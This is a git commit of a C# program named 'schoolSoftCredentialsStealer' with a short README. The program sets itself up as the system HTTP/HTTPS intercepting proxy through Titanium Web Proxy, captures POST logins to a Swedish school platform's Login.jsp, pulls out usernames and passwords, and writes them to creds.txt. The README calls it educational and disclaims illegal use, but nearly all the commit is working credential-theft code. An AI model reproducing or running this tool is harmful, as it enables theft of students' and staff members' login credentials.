0bc4031e2edb061a582d597a7467408ed0676cdb
Edythator <edythator@gmail.com>
2019-08-22 02:29:18 +0200

    Initial release

---
+++ Program.cs
@@ -0,0 +1,39 @@
+﻿using System;
+using System.IO;
+using System.Threading.Tasks;
+using System.Net;
+using Titanium.Web.Proxy;
+using Titanium.Web.Proxy.EventArguments;
+using Titanium.Web.Proxy.Models;
+
+namespace schoolSoftCredentialsStealer
+{  
+    class Program
+    {
+        static void Main()
+        {
+            using (ProxyServer ps = new ProxyServer(true, true, true))
+            {
+                ps.BeforeRequest += OnRequest;
+                var explicitEndPoint = new ExplicitProxyEndPoint(IPAddress.Any, 8000, true);
+                ps.AddEndPoint(explicitEndPoint);
+                ps.Start();
+                ps.SetAsSystemHttpProxy(explicitEndPoint);
+                ps.SetAsSystemHttpsProxy(explicitEndPoint);
+
+                Console.ReadLine();
+            }
+        }
+        public static async Task OnRequest(object sender, SessionEventArgs e)
+        {
+            if (e.HttpClient.Request.Method.ToUpper() == "POST" && e.HttpClient.Request.RequestUri.AbsoluteUri.Contains("/jsp/Login.jsp"))
+            {
+                string bodyString = await e.GetRequestBodyAsString();
+                string readableCreds = "Username: " + bodyString.Split('&')[2].Split('=')[1] + "\n" + "Password: " + bodyString.Split('&')[3].Split('=')[1] + "\n";
+                
+                Console.WriteLine(readableCreds);
+                File.AppendAllText("creds.txt", readableCreds);
+            }
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,5 @@
+This program was created to demonstrate the quality of one of the most popular Swedish school platforms. Alongside it being slow, buggy and old, it also has security flaws. I hate this platform more than anything else and I hope it sees its demise soon.
+
+Depends on Titanium Web Proxy.
+
+This program is only made for educational purposes and nothing else. I do not codone of using this program for any type of illegal activity.
